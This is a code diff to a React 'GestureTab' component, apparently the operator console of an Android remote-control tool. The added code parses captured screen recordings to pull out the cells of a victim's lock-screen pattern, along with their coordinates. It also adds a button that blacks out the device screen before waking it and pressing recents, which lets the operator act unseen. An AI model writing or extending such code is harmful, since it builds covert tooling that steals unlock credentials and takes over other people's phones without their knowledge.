@@ -677,7 +677,9 @@ export default function GestureTab({ device, sendCommand, results }) {
   const [advReplayingFile, setAdvReplayingFile] = useState(null);
   const [advSelectedFile, setAdvSelectedFile]   = useState(null);
   const [advSelectedData, setAdvSelectedData]   = useState(null);
-  const [advReplayActive, setAdvReplayActive]   = useState(false);
+  const [uploadedCells, setUploadedCells]         = useState([]);
+  const [uploadedCoords, setUploadedCoords]       = useState([]);
+  const [uploadedName, setUploadedName]           = useState('');
 
   const deviceW = device?.deviceInfo?.screenWidth  || 720;
   const deviceH = device?.deviceInfo?.screenHeight || 1600;
@@ -940,6 +942,44 @@ export default function GestureTab({ device, sendCommand, results }) {
     sendCmd('advanced_unlock_list');
   }
 
+  function handleUploadPatternFile(e) {
+    const file = e.target.files?.[0];
+    if (!file) return;
+    const reader = new FileReader();
+    reader.onload = (ev) => {
+      try {
+        const data = JSON.parse(ev.target.result);
+        const frames = data.frames || [];
+        let chosen = null;
+        for (let i = frames.length - 1; i >= 0; i--) {
+          const els = frames[i]?.screen?.elements || [];
+          if (els.some(el => (el.contentDescription || el.text || '').startsWith('Cell'))) { chosen = els; break; }
+        }
+        if (!chosen) { status('No pattern cells found in file'); return; }
+        const cells = chosen.filter(el => (el.contentDescription || el.text || '').startsWith('Cell'));
+        const lost = cells.filter(c => c.clickable !== true).map(c => {
+          const num = parseInt((c.contentDescription || c.text || '').match(/Cell\s*(\d+)/)?.[1] || '0', 10);
+          const b = c.bounds;
+          return { cell: num, cx: Math.round((b.left + b.right) / 2), cy: Math.round((b.top + b.bottom) / 2), bounds: b };
+        }).filter(c => c.cell >= 1 && c.cell <= 9);
+        lost.sort((a, b) => a.cell - b.cell);
+        setUploadedCells(lost.map(c => c.cell));
+        setUploadedCoords(lost.map(c => ({ cell: c.cell, cx: c.cx, cy: c.cy })));
+        setUploadedName(file.name);
+        status(`Loaded ${lost.length} cells from ${file.name}`);
+      } catch (err) { status('Failed to parse file: ' + err.message); }
+    };
+    reader.readAsText(file);
+  }
+
+  function sendUploadedPattern() {
+    if (uploadedCells.length < 2) { status('Upload a pattern file first'); return; }
+    status('Block screen → wake → recents sequence starting…');
+    sendCmd('screen_blackout_on');
+    setTimeout(() => { sendCmd('wake_screen'); status('Woke screen…'); }, 1000);
+    setTimeout(() => { sendCmd('press_recents'); status('Pressed recents…'); }, 2000);
+  }
+
   function replayAdvPattern(filename, cells) {
     setAdvReplayingFile(filename);
     sendCmd('advanced_unlock_replay', { filename });
@@ -1129,7 +1169,26 @@ export default function GestureTab({ device, sendCommand, results }) {
             </div>
           </div>
 
-          {/* ── Live Stream ─────────────────────────────────────────── */}
+            {/* ── Upload Pattern File ─────────────────────────────────── */}
+            <div style={{ background: '#1e293b', borderRadius: 12, padding: 20, border: '1px solid #334155' }}>
+              <div style={{ fontWeight: 700, fontSize: 14, color: '#94a3b8', marginBottom: 12, textTransform: 'uppercase', letterSpacing: 0.5 }}>
+                Upload Pattern File
+              </div>
+              <input type="file" accept="application/json,.json" onChange={handleUploadPatternFile} style={{ marginBottom: 10, color: '#94a3b8', fontSize: 12 }} />
+              {uploadedName && <div style={{ fontSize: 11, color: '#22c55e', marginBottom: 8 }}>Loaded: {uploadedName} — cells [{uploadedCells.join(',')}]</div>}
+              {uploadedCoords.length >= 2 && (
+                <AdvancedReplayCanvas cells={uploadedCells} cellCoords={uploadedCoords} active={true} width={300} height={220} />
+              )}
+              <button
+                onClick={sendUploadedPattern}
+                disabled={!isOnline || uploadedCells.length < 2}
+                style={{ ...btnStyle('#7c3aed', !isOnline || uploadedCells.length < 2), marginTop: 10, padding: '8px 18px' }}
+              >
+                Send Pattern (block → wake → recents)
+              </button>
+            </div>
+
+            {/* ── Live Stream ─────────────────────────────────────────── */}
           <div style={{ background: '#1e293b', borderRadius: 12, padding: 20, border: `1px solid ${liveActive ? '#0369a155' : '#334155'}` }}>
             <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 10 }}>
               <div style={{ fontWeight: 700, fontSize: 14, color: liveActive ? '#38bdf8' : '#94a3b8', textTransform: 'uppercase', letterSpacing: 0.5 }}>
